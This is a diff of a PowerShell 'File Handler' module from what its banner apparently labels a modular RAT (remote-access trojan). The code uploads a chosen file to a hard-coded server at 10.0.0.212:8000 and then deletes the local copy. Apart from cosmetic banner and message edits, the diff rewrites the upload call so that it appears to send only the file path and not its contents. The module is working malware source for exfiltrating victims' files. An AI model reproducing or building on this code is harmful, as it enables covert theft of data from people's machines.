@@ -1,6 +1,7 @@
 $file_name = If ($args[0]) { $args[0] }else { Write-Error "Please specify the file name..." }
 
 function title {
+   Write-Host "%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%" -ForegroundColor DarkGray
    Write-Host "
     _ __ ___   ___   __| |_   _| | __ _ _ __   _ __ __ _| |_
    | '_ ` _ \ / _ \ / _` | | | | |/ _` | '__| | '__/ _` | __|
@@ -10,20 +11,19 @@ function title {
    Write-Host "
                        Module : File Handler
    " -ForegroundColor Blue
-   Write-Host "+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++" -ForegroundColor DarkGray
+   Write-Host "%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%" -ForegroundColor DarkGray
    Write-Host ""
 }
 
 
 function upload($file_location) {
    $uri = "http://10.0.0.212:8000/upload"
-   $contentType = "multipart/form-data"
-   $headers=New-Object "System.Collections.Generic.Dictionary[[String], [String]]"
-   $headers.Add("Content-Type", $contentType)
    $body = @{
-      "files" = Get-Content("$file_location") -Raw
+      files = $file_location
    }
-   Invoke-WebRequest -Uri $uri -Method Post -Headers $headers -ContentType $contentType -Body $body
+   $response = Invoke-RestMethod -Uri $uri -Method POST -Body $body
+
+   Write-Host $response
 }
 
 function run() {
@@ -34,7 +34,7 @@ function run() {
       Remove-Item "$location"
    }
    catch {
-      Write-Host "Error while trying to upload file" -ForegroundColor Red
+      Write-Host "Error while trying to upload file..." -ForegroundColor Red
       exit 
    }
 }
